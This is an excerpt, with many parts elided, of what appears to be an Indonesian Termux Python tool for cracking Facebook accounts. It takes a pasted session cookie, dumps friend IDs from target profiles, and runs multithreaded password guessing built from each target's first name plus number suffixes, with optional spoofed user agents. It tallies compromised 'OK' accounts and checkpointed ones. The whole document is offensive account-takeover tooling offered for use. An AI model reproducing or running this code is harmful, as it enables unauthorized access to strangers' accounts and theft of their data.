...
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		your_cookies = input(' ╰─   Paste cookie : ')
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n ╰─  Login sucses | again run the tool");exit()
...
def menu(my_name,my_id):
	...
	table.add_row("01","𝐶𝑅𝐴𝐶𝐾 𝑃𝑈𝐵𝐿𝐼𝐾","ON")
	table.add_row("02","ᴄʀᴀᴄᴋ ᴍᴀssᴀʟ","ON")
	table.add_row("03","ᴄʀᴀᴄᴋ ғɪʟᴇ","ON")
	#table.add_row("04","𝑐𝑒𝑘 𝑟𝑒𝑠𝑢𝑙𝑡","ON")
	#table.add_row("05", "Tᴇʟᴇɢʀᴀᴍ ᴜᴇsᴀʀ","ON")
	#table.add_row("06","ᴄʜᴀɴɴᴇʟ ᴛᴇʟᴇɢʀᴀᴍ"," ", "ON")
	table.add_row("00", "Log Out Cookies", "ON")
	Consol=Console()
	...
	if RAF_MKZ in ['1','01']:
		...
		os.system("xdg-open https://t.me/@nError404h")
		...
		os.system("xdg-open https://t.me/Termux1778")
	elif RAF_MKZ in ['0','00']:
...
def raf_dump():
	try:
		...
		exit()
	pil = input(f'{P} ╰─  {P} ID target input : \x1b[1;92m ')
	try:
		...
		print('')
		print(f'{M} ╰─  {P}Total ID yang dumbing : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' ╰─  Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' ╰─  check your cookie and id why is not dumbing?')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'{m}╰─ {P}how many id woant to crack?  :  \x1b[1;92m')) 
	except ValueError:
		print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'{m}╰─ {P}print Idz Target to crack ' +str(yz)+ ' : \x1b[1;92' )
		uid.append(kl)
	for userr in uid:
		try:
...
def setting():
	...
	table.add_row("01","CRACK ID RANDOM","VERY RECOMENDED")
	cetak(nel(table, width=79, title=f"[bold green]URUTAN ID",style="bold hot_pink2"))
	hu = Console().input(f'[bold red] ╰─ [bold white]chose : ')
	if hu in ['10','010']:
	...
	table.add_column("STATUS",justify="center",width=20,style="green")
	table.add_row("01","METHOD","VERY BEST")
	table.add_row("02","METHOD","BEST")
	#table.add_row("03","reguler m.fb","Not Very")
	#table.add_row("04","validate m.fb","Not Very")
...
#		pwpluss.append('no')
	...
	uatambah = input(f'\r╰─  {P}ADD USER AGENT(UA) Y/N : \x1b[1;93m ')
	if uatambah in ['y','Ya','ya','Y']:
		uman.append('y')
		bzer = input(f' ╰─  User-Agent input : \x1b[1;93m ')
		usman1.append(bzer)
	else:
		uman.append('tidak')
	passwrd()
...
def passwrd():
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if len(nmf)<6:
					...
					pwv.append(frs+'0099887766')
					
					pwv.append(frs+'009988778855')
					pwv.append(frs+'0099887744')
					
					pwv.append(frs+'009988774433')
					
					pwv.append(frs+'0099887744')
					
					pwv.append(frs+'0099887744332211')
	...
	print(f'  [{h}•{x}]{h} Oᴋ_Eʀʀᴏʀ404✅ : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} Cᴘ_Eʀʀᴏʀ404❌ : {k}%s{x} '%(cp))
